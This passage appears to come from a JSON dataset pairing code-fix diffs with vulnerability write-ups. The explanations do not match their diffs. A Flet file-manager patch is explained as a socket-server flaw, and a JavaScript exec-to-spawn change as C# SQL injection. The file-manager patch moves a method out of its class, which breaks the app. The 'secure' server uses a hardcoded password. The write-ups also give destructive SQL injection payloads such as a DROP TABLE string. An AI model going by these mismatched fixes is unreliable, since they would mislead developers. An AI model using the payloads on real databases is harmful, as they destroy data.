        "diff": "--- project.py\t2025-04-28 09:14:10.000000000 -0400\n+++ project-new.py\t2025-04-28 09:14:10.000000000 -0400\n@@ -1,336 +1,364 @@\n-import os\n-import shutil\n-import logging\n-from datetime import datetime\n-import flet as ft\n-import matplotlib.pyplot as plt\n-import numpy as np\n-from darkdetect import isDark\n-\n-from config import DEFAULT_FOLDERS\n-\n-logging.basicConfig(filename='./assets/file_manager.log', level=logging.INFO)\n-\n-plt.switch_backend('Agg')\n-\n-\n-class FileManagerApp:\n-    \"\"\"A file management application.\"\"\"\n-    \n-    def __init__(self, page: ft.Page):\n-        \"\"\"\n-        Initializes the FileManagerApp.\n-\n-        Args:\n-            page (ft.Page): The Flet page to display the application.\n-        \"\"\"\n-        self.page = page\n-        self.page.title = \"File Manager\"\n-        self.page.window_width = 1280\n-        self.page.window_height = 760\n-        self.page.window_min_width = 1280\n-        self.page.window_min_height = 760\n-        self.page.window_resizable = True\n-        self.page.window_icon = \"./assets/icon1.png\"\n-\n-        self.init_ui()\n-\n-        self.custom_folders = []\n-\n-        # Initialize FilePicker\n-        self.file_picker = ft.FilePicker(on_result=self.on_pick_result)\n-        self.page.overlay.append(self.file_picker)\n-        self.page.update()\n-\n-    def init_ui(self):\n-        \"\"\"Initializes the UI components.\"\"\"\n-        self.src_dir_input = ft.TextField(label=\"Source Directory\", width=300, read_only=True)\n-        self.pick_src_button = ft.ElevatedButton(\n-            text=\"Select Source Directory\",\n-            on_click=self.on_pick_src_click,\n-            icon=ft.icons.FOLDER_OPEN,\n-            color=ft.colors.BLUE\n-        )\n-\n-        self.music_input = ft.TextField(label=\"Custom Music Folder\", width=300, value=\"Music\")\n-        self.photos_input = ft.TextField(label=\"Custom Photos Folder\", width=300, value=\"Photos\")\n-        self.docs_input = ft.TextField(label=\"Custom Documents Folder\", width=300, value=\"Documents\")\n-        self.videos_input = ft.TextField(label=\"Custom Videos Folder\", width=300, value=\"Videos\")\n-\n-        self.custom_folder_input = ft.TextField(label=\"Custom Folder Name\", width=300)\n-        self.custom_exts_input = ft.TextField(label=\"File Extensions (comma-separated)\", width=300)\n-        self.add_custom_button = ft.ElevatedButton(\n-            text=\"Add Custom Folder\",\n-            on_click=self.on_add_custom_click,\n-            icon=ft.icons.ADD,\n-            color=ft.colors.GREEN\n-        )\n-\n-        self.custom_list = ft.Column()\n-        self.organize_button = ft.ElevatedButton(\n-            text=\"Organize Files\",\n-            on_click=self.on_organize_click,\n-            icon=ft.icons.SORT,\n-            color=ft.colors.PURPLE\n-        )\n-        self.summary_input = ft.TextField(\n-            label=\"Summary After Organize\",\n-            multiline=True,\n-            width=300,\n-            height=200,\n-            read_only=True\n-        )\n-        self.progress_bar = ft.ProgressBar(width=300)\n-        self.progress_bar.visible = False\n-        \n-        self.plot_image = ft.Image(width=600, height=400, src=\"Nothing\", fit=ft.ImageFit.CONTAIN)\n-        self.author_mark = ft.Text(\"Developed by YASH\", size=12, color=ft.colors.GREY)\n-        self.author_row = ft.Row([self.author_mark], alignment=ft.MainAxisAlignment.CENTER)\n-\n-        self.page.add(\n-            ft.Column([\n-                ft.Row([\n-                    ft.Column([\n-                        ft.Column([self.src_dir_input, self.pick_src_button]),\n-                        ft.Divider(),\n-                        self.music_input,\n-                        self.photos_input,\n-                        self.docs_input,\n-                        self.videos_input,\n-                        ft.Divider(),\n-                        ft.Text(\"Add Custom Folder\"),\n-                        self.custom_folder_input,\n-                        self.custom_exts_input,\n-                        self.add_custom_button,\n-                        self.custom_list,\n-                        ft.Divider(),\n-                    ], scroll=ft.ScrollMode.ALWAYS),\n-                    self.plot_image,\n-                    ft.Column([\n-                        self.organize_button,\n-                        self.progress_bar,\n-                        self.summary_input,\n-                    ]),\n-                ], scroll=ft.ScrollMode.ALWAYS),\n-                self.author_row,\n-            ], scroll=ft.ScrollMode.ALWAYS, alignment=ft.MainAxisAlignment.CENTER)\n-        )\n-\n-    def get_folders(self):\n-        \"\"\"Retrieve folder names for each file type.\"\"\"\n-        folders = {self.music_input.value: DEFAULT_FOLDERS['Music'],\n-                   self.photos_input.value: DEFAULT_FOLDERS['Photos'],\n-                   self.docs_input.value: DEFAULT_FOLDERS['Docs'],\n-                   self.videos_input.value: DEFAULT_FOLDERS['Videos']}\n-        for folder_name, folder_exts in self.custom_folders:\n-            folders[folder_name] = folder_exts\n-        folders[\"Others\"] = []\n-        return folders\n-\n-    def create_dirs(self, base_dir, folders):\n-        \"\"\"Create folders for each file type if they don't exist.\"\"\"\n-        for folder in folders.keys():\n-            folder_path = os.path.join(base_dir, folder)\n-            if not os.path.exists(folder_path):\n-                try:\n-                    os.makedirs(folder_path)\n-                    logging.info(f\"Created folder: {folder_path}\")\n-                except Exception as e:\n-                    logging.error(f\"Error creating folder {folder_path}: {e}\")\n-                    self.show_error_dialog(f\"Error creating folder {folder_path}: {e}\")\n-\n-    def move_file(self, file, base_dir, folders):\n-        \"\"\"Move a file to the appropriate folder based on its extension.\"\"\"\n-        try:\n-            file_ext = file.split('.')[-1].lower()\n-            moved = False\n-            for folder, exts in folders.items():\n-                if file_ext in exts:\n-                    dest_folder = os.path.join(base_dir, folder)\n-                    shutil.move(os.path.join(base_dir, file), dest_folder)\n-                    logging.info(f\"Moved file: {file} to {dest_folder}\")\n-                    moved = True\n-                    break\n-            if not moved:\n-                others_folder = os.path.join(base_dir, \"Others\")\n-                shutil.move(os.path.join(base_dir, file), others_folder)\n-                logging.info(f\"Moved file: {file} to {others_folder}\")\n-        except Exception as e:\n-            logging.error(f\"Error moving file {file}: {e}\")\n-            self.show_error_dialog(f\"Error moving file {file}: {e}\")\n-\n-    def organize_files(self, src_dir, folders):\n-        \"\"\"Organize files in the source directory into specific folders.\"\"\"\n-        self.create_dirs(src_dir, folders)\n-        for file in os.listdir(src_dir):\n-            file_path = os.path.join(src_dir, file)\n-            if os.path.isfile(file_path):\n-                self.move_file(file, src_dir, folders)\n-\n-    def backup_files(self, src_dir):\n-        \"\"\"Backup files in the source directory before organizing.\"\"\"\n-        try:\n-            backup_dir = os.path.join(src_dir, 'backup_' + datetime.now().strftime('%Y%m%d_%H%M%S'))\n-            shutil.copytree(src_dir, backup_dir)\n-            logging.info(f\"Backup created at: {backup_dir}\")\n-            return backup_dir\n-        except Exception as e:\n-            logging.error(f\"Error creating backup: {e}\")\n-            self.show_error_dialog(f\"Error creating backup: {e}\")\n-            return None\n-\n-    def summarize_files(self, src_dir):\n-        \"\"\"Provide a summary of the file types and their counts.\"\"\"\n-        file_sizes = {}\n-        logging.info(f\"Summarizing files in directory: {src_dir}\")\n-        \n-        for root, _, files in os.walk(src_dir):\n-            for file in files:\n-                file_path = os.path.join(root, file)\n-                if os.path.isfile(file_path):\n-                    file_ext = os.path.splitext(file)[1].lower()\n-                    file_size = os.path.getsize(file_path) / (1024 * 1024)  # Convert to MB\n-                    if file_ext in file_sizes:\n-                        file_sizes[file_ext] += file_size\n-                    else:\n-                        file_sizes[file_ext] = file_size\n-\n-        logging.info(f\"File sizes summary: {file_sizes}\")\n-        return file_sizes\n-\n-    def format_summary(self, file_sizes):\n-        \"\"\"Format the summary of file sizes for display.\"\"\"\n-        sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)\n-        formatted_summary = \"In order of size of each type of file:\\n\"\n-        for ext, size in sorted_files:\n-            formatted_summary += f\"{ext.upper()[1:]}: {size:.1f}MB\\n\"\n-        return formatted_summary\n-\n-\n-    def plot_summary(self, file_sizes, dark_mode=isDark(), plot_file=\"./assets/plot_summary.png\"):\n-        \"\"\"\n-        Plot the summary of file sizes and save it as an image file.\n-\n-        Parameters:\n-        - file_sizes: dict, a dictionary with file extensions as keys and their sizes as values.\n-        - dark_mode: bool, whether to use dark mode for the plot.\n-        - plot_file: str, the name of the file where the plot will be saved.\n-\n-        Returns:\n-        - plot_file: str, the path to the saved plot image.\n-        \"\"\"\n-        if not file_sizes:\n-            raise ValueError(\"file_sizes dictionary is empty\")\n-\n-        extensions = list(file_sizes.keys())\n-        sizes = list(file_sizes.values())\n-        colors = plt.cm.tab20c(np.linspace(0, 1, len(extensions)))\n-\n-        fig, ax = plt.subplots(facecolor='black' if dark_mode else 'white')\n-        patches, texts, autotexts = ax.pie(sizes, labels=extensions, colors=colors, autopct='%1.1f%%', startangle=140)\n-\n-        # Setting text color based on dark mode\n-        label_color = 'white' if dark_mode else 'black'\n-        for text in texts:\n-            text.set_color(label_color)\n-        for autotext in autotexts:\n-            autotext.set_color(label_color)\n-\n-        ax.set_facecolor('black' if dark_mode else 'white')\n-        ax.set_title(\"File Sizes by Type\", color=label_color, fontweight='bold')\n-\n-        # Calculate total storage consumed\n-        total_storage = sum(sizes)\n-        total_storage_text = f\"Total Storage Consumed: {total_storage:.2f} MB\"\n-        \n-        # Add total storage text to the plot\n-        plt.text(0, -1.5, total_storage_text, ha='center', color=label_color, fontsize=12, fontweight='bold')\n-\n-        plt.tight_layout()\n-        plt.savefig(plot_file, transparent=True)\n-        plt.close(fig)\n-\n-        return plot_file\n-\n-\n-\n-    def on_pick_src_click(self, e):\n-        \"\"\"Callback for selecting the source directory.\"\"\"\n-        self.file_picker.get_directory_path()\n-\n-    def on_add_custom_click(self, e):\n-        \"\"\"Callback for adding a custom folder.\"\"\"\n-        folder_name = self.custom_folder_input.value\n-        folder_exts = [ext.strip().lower() for ext in self.custom_exts_input.value.split(',')]\n-        if folder_name and folder_exts:\n-            self.custom_folders.append((folder_name, folder_exts))\n-            self.custom_list.controls.append(ft.Text(f\"{folder_name}: {', '.join(folder_exts)}\"))\n-            self.custom_folder_input.value = \"\"\n-            self.custom_exts_input.value = \"\"\n-            self.page.update()\n-            self.page.dialog = ft.AlertDialog(\n-                title=ft.Text(\"Success\"),\n-                content=ft.Text(f\"Added custom folder {folder_name} with extensions: {', '.join(folder_exts)}\")\n-            )\n-            self.page.dialog.open = True\n-            self.page.update()\n-        else:\n-            self.show_error_dialog(\"Please provide both folder name and extensions.\")\n-\n-    def on_organize_click(self, e):\n-        \"\"\"Callback for organizing files.\"\"\"\n-        src_dir = self.src_dir_input.value\n-        if os.path.isdir(src_dir):\n-            folders = self.get_folders()\n-            self.progress_bar.visible = True\n-            self.page.update()\n-            backup_dir = self.backup_files(src_dir)\n-            if backup_dir:\n-                try:\n-                    self.organize_files(src_dir, folders)\n-                    file_sizes = self.summarize_files(src_dir)\n-                    summary_text = self.format_summary(file_sizes)\n-                    self.summary_input.value = summary_text\n-                    plot_file = self.plot_summary(file_sizes)\n-                    if plot_file and os.path.exists(plot_file):\n-                        self.plot_image.src = plot_file\n-                    else:\n-                        self.plot_image.alt = \"Nothing\"\n-                    self.plot_image.update()\n-                    self.page.update()\n-                except Exception as e:\n-                    logging.error(f\"Error organizing files: {e}\")\n-                    self.show_error_dialog(f\"Error organizing files: {e}\")\n-            self.progress_bar.visible = False\n-            self.page.update()\n-        else:\n-            self.show_error_dialog(f\"Directory {src_dir} does not exist.\")\n-\n-    def on_pick_result(self, result: ft.FilePickerResultEvent) -> None:\n-        \"\"\"Callback for picking a directory using FilePicker.\"\"\"\n-        if result and result.path:\n-            if os.path.isdir(result.path):\n-                self.src_dir_input.value = result.path\n-                self.page.update()\n-            else:\n-                self.show_error_dialog(\"Please select a valid directory.\")\n-        else:\n-            self.show_error_dialog(\"No directory selected.\")\n-\n-    def show_error_dialog(self, message):\n-        \"\"\"Show an error dialog with the specified message.\"\"\"\n-        self.page.dialog = ft.AlertDialog(\n-            title=ft.Text(\"Error\"),\n-            content=ft.Text(message)\n-        )\n-        self.page.dialog.open = True\n-        self.page.update()\n-\n-\n-def main(page: ft.Page):\n-    \"\"\"Main function to start the application.\"\"\"\n-    FileManagerApp(page)\n-\n-\n-if __name__ == \"__main__\":\n-    ft.app(target=main)\n+import os\n+import shutil\n+import logging\n+from datetime import datetime\n+import flet as ft\n+import matplotlib.pyplot as plt\n+import numpy as np\n+from darkdetect import isDark\n+import re\n+\n+from config import DEFAULT_FOLDERS\n+\n+logging.basicConfig(filename='./assets/file_manager.log', level=logging.INFO)\n+\n+plt.switch_backend('Agg')\n+\n+# Add this at the class level or as a constant outside the class\n+ALLOWED_EXTENSIONS = {\n+    'mp3', 'wav', 'flac',       # music\n+    'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff',  # images\n+    'doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx',  # documents\n+    'mp4', 'avi', 'mkv', 'mov', 'wmv',           # videos\n+    # Add other safe extensions as needed\n+}\n+\n+def sanitize_folder_name(name):\n+    # Allow only alphanumeric, spaces, dashes and underscores in folder names\n+    return re.sub(r'[^a-zA-Z0-9 _-]', '', name).strip()\n+\n+def on_add_custom_click(self, e):\n+    folder_name = self.custom_folder_input.value\n+    folder_name = sanitize_folder_name(folder_name)\n+    folder_exts_raw = self.custom_exts_input.value\n+    folder_exts = [ext.strip().lower() for ext in folder_exts_raw.split(',') if ext.strip()]\n+\n+    if not folder_name:\n+        self.show_error_dialog(\"Folder name cannot be empty or contain invalid characters.\")\n+        return\n+\n+    if not folder_exts:\n+        self.show_error_dialog(\"Please provide at least one file extension.\")\n+        return\n+\n+    # Validate extensions against whitelist\n+    invalid_exts = [ext for ext in folder_exts if ext not in ALLOWED_EXTENSIONS]\n+    if invalid_exts:\n+        self.show_error_dialog(f\"The following extensions are not allowed: {', '.join(invalid_exts)}\")\n+        return\n+\n+    # Add the custom folder only if validations pass\n+    self.custom_folders.append((folder_name, folder_exts))\n+    self.custom_list.controls.append(ft.Text(f\"{folder_name}: {', '.join(folder_exts)}\"))\n+    self.custom_folder_input.value = \"\"\n+    self.custom_exts_input.value = \"\"\n+    self.page.update()\n+    self.page.dialog = ft.AlertDialog(\n+        title=ft.Text(\"Success\"),\n+        content=ft.Text(f\"Added custom folder {folder_name} with extensions: {', '.join(folder_exts)}\")\n+    )\n+    self.page.dialog.open = True\n+    self.page.update()\n+\n+\n+class FileManagerApp:\n+    \"\"\"A file management application.\"\"\"\n+    \n+    def __init__(self, page: ft.Page):\n+        \"\"\"\n+        Initializes the FileManagerApp.\n+\n+        Args:\n+            page (ft.Page): The Flet page to display the application.\n+        \"\"\"\n+        self.page = page\n+        self.page.title = \"File Manager\"\n+        self.page.window_width = 1280\n+        self.page.window_height = 760\n+        self.page.window_min_width = 1280\n+        self.page.window_min_height = 760\n+        self.page.window_resizable = True\n+        self.page.window_icon = \"./assets/icon1.png\"\n+\n+        self.init_ui()\n+\n+        self.custom_folders = []\n+\n+        # Initialize FilePicker\n+        self.file_picker = ft.FilePicker(on_result=self.on_pick_result)\n+        self.page.overlay.append(self.file_picker)\n+        self.page.update()\n+\n+    def init_ui(self):\n+        \"\"\"Initializes the UI components.\"\"\"\n+        self.src_dir_input = ft.TextField(label=\"Source Directory\", width=300, read_only=True)\n+        self.pick_src_button = ft.ElevatedButton(\n+            text=\"Select Source Directory\",\n+            on_click=self.on_pick_src_click,\n+            icon=ft.icons.FOLDER_OPEN,\n+            color=ft.colors.BLUE\n+        )\n+\n+        self.music_input = ft.TextField(label=\"Custom Music Folder\", width=300, value=\"Music\")\n+        self.photos_input = ft.TextField(label=\"Custom Photos Folder\", width=300, value=\"Photos\")\n+        self.docs_input = ft.TextField(label=\"Custom Documents Folder\", width=300, value=\"Documents\")\n+        self.videos_input = ft.TextField(label=\"Custom Videos Folder\", width=300, value=\"Videos\")\n+\n+        self.custom_folder_input = ft.TextField(label=\"Custom Folder Name\", width=300)\n+        self.custom_exts_input = ft.TextField(label=\"File Extensions (comma-separated)\", width=300)\n+        self.add_custom_button = ft.ElevatedButton(\n+            text=\"Add Custom Folder\",\n+            on_click=self.on_add_custom_click,\n+            icon=ft.icons.ADD,\n+            color=ft.colors.GREEN\n+        )\n+\n+        self.custom_list = ft.Column()\n+        self.organize_button = ft.ElevatedButton(\n+            text=\"Organize Files\",\n+            on_click=self.on_organize_click,\n+            icon=ft.icons.SORT,\n+            color=ft.colors.PURPLE\n+        )\n+        self.summary_input = ft.TextField(\n+            label=\"Summary After Organize\",\n+            multiline=True,\n+            width=300,\n+            height=200,\n+            read_only=True\n+        )\n+        self.progress_bar = ft.ProgressBar(width=300)\n+        self.progress_bar.visible = False\n+        \n+        self.plot_image = ft.Image(width=600, height=400, src=\"Nothing\", fit=ft.ImageFit.CONTAIN)\n+        self.author_mark = ft.Text(\"Developed by YASH\", size=12, color=ft.colors.GREY)\n+        self.author_row = ft.Row([self.author_mark], alignment=ft.MainAxisAlignment.CENTER)\n+\n+        self.page.add(\n+            ft.Column([\n+                ft.Row([\n+                    ft.Column([\n+                        ft.Column([self.src_dir_input, self.pick_src_button]),\n+                        ft.Divider(),\n+                        self.music_input,\n+                        self.photos_input,\n+                        self.docs_input,\n+                        self.videos_input,\n+                        ft.Divider(),\n+                        ft.Text(\"Add Custom Folder\"),\n+                        self.custom_folder_input,\n+                        self.custom_exts_input,\n+                        self.add_custom_button,\n+                        self.custom_list,\n+                        ft.Divider(),\n+                    ], scroll=ft.ScrollMode.ALWAYS),\n+                    self.plot_image,\n+                    ft.Column([\n+                        self.organize_button,\n+                        self.progress_bar,\n+                        self.summary_input,\n+                    ]),\n+                ], scroll=ft.ScrollMode.ALWAYS),\n+                self.author_row,\n+            ], scroll=ft.ScrollMode.ALWAYS, alignment=ft.MainAxisAlignment.CENTER)\n+        )\n+\n+    def get_folders(self):\n+        \"\"\"Retrieve folder names for each file type.\"\"\"\n+        folders = {self.music_input.value: DEFAULT_FOLDERS['Music'],\n+                   self.photos_input.value: DEFAULT_FOLDERS['Photos'],\n+                   self.docs_input.value: DEFAULT_FOLDERS['Docs'],\n+                   self.videos_input.value: DEFAULT_FOLDERS['Videos']}\n+        for folder_name, folder_exts in self.custom_folders:\n+            folders[folder_name] = folder_exts\n+        folders[\"Others\"] = []\n+        return folders\n+\n+    def create_dirs(self, base_dir, folders):\n+        \"\"\"Create folders for each file type if they don't exist.\"\"\"\n+        for folder in folders.keys():\n+            folder_path = os.path.join(base_dir, folder)\n+            if not os.path.exists(folder_path):\n+                try:\n+                    os.makedirs(folder_path)\n+                    logging.info(f\"Created folder: {folder_path}\")\n+                except Exception as e:\n+                    logging.error(f\"Error creating folder {folder_path}: {e}\")\n+                    self.show_error_dialog(f\"Error creating folder {folder_path}: {e}\")\n+\n+    def move_file(self, file, base_dir, folders):\n+        \"\"\"Move a file to the appropriate folder based on its extension.\"\"\"\n+        try:\n+            file_ext = file.split('.')[-1].lower()\n+            moved = False\n+            for folder, exts in folders.items():\n+                if file_ext in exts:\n+                    dest_folder = os.path.join(base_dir, folder)\n+                    shutil.move(os.path.join(base_dir, file), dest_folder)\n+                    logging.info(f\"Moved file: {file} to {dest_folder}\")\n+                    moved = True\n+                    break\n+            if not moved:\n+                others_folder = os.path.join(base_dir, \"Others\")\n+                shutil.move(os.path.join(base_dir, file), others_folder)\n+                logging.info(f\"Moved file: {file} to {others_folder}\")\n+        except Exception as e:\n+            logging.error(f\"Error moving file {file}: {e}\")\n+            self.show_error_dialog(f\"Error moving file {file}: {e}\")\n+\n+    def organize_files(self, src_dir, folders):\n+        \"\"\"Organize files in the source directory into specific folders.\"\"\"\n+        self.create_dirs(src_dir, folders)\n+        for file in os.listdir(src_dir):\n+            file_path = os.path.join(src_dir, file)\n+            if os.path.isfile(file_path):\n+                self.move_file(file, src_dir, folders)\n+\n+    def backup_files(self, src_dir):\n+        \"\"\"Backup files in the source directory before organizing.\"\"\"\n+        try:\n+            backup_dir = os.path.join(src_dir, 'backup_' + datetime.now().strftime('%Y%m%d_%H%M%S'))\n+            shutil.copytree(src_dir, backup_dir)\n+            logging.info(f\"Backup created at: {backup_dir}\")\n+            return backup_dir\n+        except Exception as e:\n+            logging.error(f\"Error creating backup: {e}\")\n+            self.show_error_dialog(f\"Error creating backup: {e}\")\n+            return None\n+\n+    def summarize_files(self, src_dir):\n+        \"\"\"Provide a summary of the file types and their counts.\"\"\"\n+        file_sizes = {}\n+        logging.info(f\"Summarizing files in directory: {src_dir}\")\n+        \n+        for root, _, files in os.walk(src_dir):\n+            for file in files:\n+                file_path = os.path.join(root, file)\n+                if os.path.isfile(file_path):\n+                    file_ext = os.path.splitext(file)[1].lower()\n+                    file_size = os.path.getsize(file_path) / (1024 * 1024)  # Convert to MB\n+                    if file_ext in file_sizes:\n+                        file_sizes[file_ext] += file_size\n+                    else:\n+                        file_sizes[file_ext] = file_size\n+\n+        logging.info(f\"File sizes summary: {file_sizes}\")\n+        return file_sizes\n+\n+    def format_summary(self, file_sizes):\n+        \"\"\"Format the summary of file sizes for display.\"\"\"\n+        sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)\n+        formatted_summary = \"In order of size of each type of file:\\n\"\n+        for ext, size in sorted_files:\n+            formatted_summary += f\"{ext.upper()[1:]}: {size:.1f}MB\\n\"\n+        return formatted_summary\n+\n+\n+    def plot_summary(self, file_sizes, dark_mode=isDark(), plot_file=\"./assets/plot_summary.png\"):\n+        \"\"\"\n+        Plot the summary of file sizes and save it as an image file.\n+\n+        Parameters:\n+        - file_sizes: dict, a dictionary with file extensions as keys and their sizes as values.\n+        - dark_mode: bool, whether to use dark mode for the plot.\n+        - plot_file: str, the name of the file where the plot will be saved.\n+\n+        Returns:\n+        - plot_file: str, the path to the saved plot image.\n+        \"\"\"\n+        if not file_sizes:\n+            raise ValueError(\"file_sizes dictionary is empty\")\n+\n+        extensions = list(file_sizes.keys())\n+        sizes = list(file_sizes.values())\n+        colors = plt.cm.tab20c(np.linspace(0, 1, len(extensions)))\n+\n+        fig, ax = plt.subplots(facecolor='black' if dark_mode else 'white')\n+        patches, texts, autotexts = ax.pie(sizes, labels=extensions, colors=colors, autopct='%1.1f%%', startangle=140)\n+\n+        # Setting text color based on dark mode\n+        label_color = 'white' if dark_mode else 'black'\n+        for text in texts:\n+            text.set_color(label_color)\n+        for autotext in autotexts:\n+            autotext.set_color(label_color)\n+\n+        ax.set_facecolor('black' if dark_mode else 'white')\n+        ax.set_title(\"File Sizes by Type\", color=label_color, fontweight='bold')\n+\n+        # Calculate total storage consumed\n+        total_storage = sum(sizes)\n+        total_storage_text = f\"Total Storage Consumed: {total_storage:.2f} MB\"\n+        \n+        # Add total storage text to the plot\n+        plt.text(0, -1.5, total_storage_text, ha='center', color=label_color, fontsize=12, fontweight='bold')\n+\n+        plt.tight_layout()\n+        plt.savefig(plot_file, transparent=True)\n+        plt.close(fig)\n+\n+        return plot_file\n+\n+\n+\n+    def on_pick_src_click(self, e):\n+        \"\"\"Callback for selecting the source directory.\"\"\"\n+        self.file_picker.get_directory_path()\n+\n+    def on_organize_click(self, e):\n+        \"\"\"Callback for organizing files.\"\"\"\n+        src_dir = self.src_dir_input.value\n+        if os.path.isdir(src_dir):\n+            folders = self.get_folders()\n+            self.progress_bar.visible = True\n+            self.page.update()\n+            backup_dir = self.backup_files(src_dir)\n+            if backup_dir:\n+                try:\n+                    self.organize_files(src_dir, folders)\n+                    file_sizes = self.summarize_files(src_dir)\n+                    summary_text = self.format_summary(file_sizes)\n+                    self.summary_input.value = summary_text\n+                    plot_file = self.plot_summary(file_sizes)\n+                    if plot_file and os.path.exists(plot_file):\n+                        self.plot_image.src = plot_file\n+                    else:\n+                        self.plot_image.alt = \"Nothing\"\n+                    self.plot_image.update()\n+                    self.page.update()\n+                except Exception as e:\n+                    logging.error(f\"Error organizing files: {e}\")\n+                    self.show_error_dialog(f\"Error organizing files: {e}\")\n+            self.progress_bar.visible = False\n+            self.page.update()\n+        else:\n+            self.show_error_dialog(f\"Directory {src_dir} does not exist.\")\n+\n+    def on_pick_result(self, result: ft.FilePickerResultEvent) -> None:\n+        \"\"\"Callback for picking a directory using FilePicker.\"\"\"\n+        if result and result.path:\n+            if os.path.isdir(result.path):\n+                self.src_dir_input.value = result.path\n+                self.page.update()\n+            else:\n+                self.show_error_dialog(\"Please select a valid directory.\")\n+        else:\n+            self.show_error_dialog(\"No directory selected.\")\n+\n+    def show_error_dialog(self, message):\n+        \"\"\"Show an error dialog with the specified message.\"\"\"\n+        self.page.dialog = ft.AlertDialog(\n+            title=ft.Text(\"Error\"),\n+            content=ft.Text(message)\n+        )\n+        self.page.dialog.open = True\n+        self.page.update()\n+\n+\n+def main(page: ft.Page):\n+    \"\"\"Main function to start the application.\"\"\"\n+    FileManagerApp(page)\n+\n+\n+if __name__ == \"__main__\":\n+    ft.app(target=main)\n",
        "explanation": "Explanation:\nThe provided Python socket server code has multiple security issues:\nNo Encryption or Authentication: The socket communication is done in plaintext without any encryption or authentication mechanism, exposing data to interception and unauthorized access.\nUnrestricted File Access and Transfer: The server reads and sends a file (server-file.txt) without validating the client's identity or request. This could lead to unauthorized file access or data leakage.\nNo Input Validation or Sanitization: The server accepts any connection and immediately prints and processes data received from clients without validation, which could be exploited for injection or denial-of-service attacks.\nResource Management: The server does not handle exceptions or errors, which can lead to resource leaks or crashes under malicious or malformed inputs.\nPotential Race Conditions or Socket Vulnerabilities: Although not directly exploitable here, using raw sockets without proper safeguards can be vulnerable to race conditions or socket-related vulnerabilities as documented in some CPython socket issues.\n\n\n\nPOC:\nAn attacker can connect to the socket server and intercept or manipulate the data sent between client and server since it is unencrypted.\nAn attacker can send arbitrary data, potentially causing unexpected behavior or denial of service.\nIf the file server-file.txt contains sensitive data, it is sent without any access control, allowing unauthorized data exfiltration.\n\n\n\nRoot Cause including line number and vulnerable code: \nFile Server.py:\nLine 1-3: Socket is created without any security layer (no SSL/TLS).\nLine 14: Accepts any incoming connection without authentication.\nLine 18: Receives data from client without validation (data = con.recv(1024)).\nLine 20-25: Reads and sends a file without any access control or verification (file = open('server-file.txt', 'rb') and subsequent lines).\nNo exception handling or input sanitization throughout the code.\n\n\n\nExploit Scenario:\nAn attacker connects to the server socket, intercepts or injects malicious data because the connection is unencrypted and unauthenticated. They can also receive sensitive file contents without authorization. This can lead to data theft, unauthorized access, or denial of service by sending malformed data or overwhelming the server.\n\n\n\nWhy it Happens:\nThe code uses plain TCP sockets without encryption or authentication.\nIt blindly trusts all incoming connections and data.\nNo validation or error handling is implemented.\nThe file transfer mechanism does not enforce any access control or confidentiality.\n\n\n\nSecurity Implications:\nData confidentiality is compromised due to plaintext transmission.\nUnauthorized users can connect and retrieve sensitive files.\nThe server is vulnerable to denial-of-service attacks or resource exhaustion.\nPotential for injection or buffer overflow attacks if input is not validated.\n\n\nSuggested Fix:\nUse SSL/TLS to encrypt socket communication with ssl module.\nImplement authentication to verify clients before sending files.\nValidate and sanitize all inputs from clients.\nAdd error handling and resource management (try-except-finally).\nRestrict file access and avoid sending sensitive files without authorization.\nUse concurrency (e.g., threading) to handle multiple clients safely.\n\nPatched code snippet:\n\npython\nimport socket\nimport ssl\n\n# SSL context setup\ncontext = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\ncontext.load_cert_chain(certfile='server.crt', keyfile='server.key')\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind(('', 8800))\nsock.listen(10)\nprint('Secure socket is listening...')\n\nwhile True:\n    con, addr = sock.accept()\n    try:\n        # Wrap socket with SSL\n        ssl_con = context.wrap_socket(con, server_side=True)\n        print('Secure connection established with', addr)\n\n        # Simple authentication example (expecting a password)\n        ssl_con.send(b'Password: ')\n        password = ssl_con.recv(1024).decode().strip()\n        if password != 'expected_password':\n            ssl_con.send(b'Authentication failed.\\n')\n            ssl_con.close()\n            continue\n\n        ssl_con.send(b'Authentication successful. Sending file...\\n')\n\n        with open('server-file.txt', 'rb') as file:\n            while True:\n                data = file.read(1024)\n                if not data:\n                    break\n                ssl_con.send(data)\n\n        print('File has been transferred successfully.')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        ssl_con.close()\n\nThis code adds SSL encryption, basic authentication, error handling, and safe file transfer to mitigate the identified security issues"
    },
    "129": {
        "diff": "@@ const cmder = async cmd => {\n-    return new Promise((resolve, reject) => {\n-        exec(cmd, (err, stdout, stderr) => {\n-            if(err) {\n-                reject(err);\n-                return;\n-            }\n-            resolve('success');\n-        })\n-    })\n+    const { spawn } = require('child_process');\n+    const args = cmd.split(' ').filter(Boolean);\n+    const executable = args.shift();\n+    \n+    return new Promise((resolve, reject) => {\n+        const child = spawn(executable, args, { shell: false });\n+        \n+        child.on('error', err => {\n+            reject(err);\n+        });\n+\n+        child.on('exit', (code) => {\n+            if (code === 0) {\n+                resolve('success');\n+            } else {\n+                reject(new Error(`Process exited with code ${code}`));\n+            }\n+        });\n+    });\n }\n",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL\n[Line 1172,2045,2532,2564,2593,2739] Command ('SQL Injection')\nProof of Concept (Elaborated):\nVulnerable Code:\nvar findResult = recMan.Find(query);\nand\nreturn DoResponse(new EntityRelationManager().Create(relation));\nStep-by-Step Explanation:\n1.\tProblem with recMan.Find(query):\no\tThe query object is often built using user-controlled inputs without complete sanitization.\no\tIf the EntityQuery or EQL allows users to inject unexpected data or conditions, it could result in unsafe SQL execution.\n2.\tProblem with EntityRelationManager().Create(relation):\no\tIf the relation object is created based on user input without strict field validation, malicious payloads could manipulate the database layer.\n3.\tHow to Attack:\no\tSend specially crafted input inside query or relation fields.\no\tAttempt to inject raw SQL fragments, like:\no\t' OR 1=1 --\nor\n' DROP TABLE Users --\nExample Exploit:\nInput Payload Example:\n{\n  \"entityName\": \"users; DROP TABLE users; --\"\n}\nIf query construction is weak, the backend might attempt to run:\nSELECT * FROM users; DROP TABLE users; -- WHERE ...\nResult:\n\u2022\tComplete destruction of database tables.\n\u2022\tUnauthorized data exposure.\nSeverity:\nCritical (Database Compromise \u2192 Full Data Theft or Destruction)\nRoot Cause:\n\u2022\tUser input (query, relation) is directly embedded into database operations without proper sanitization, 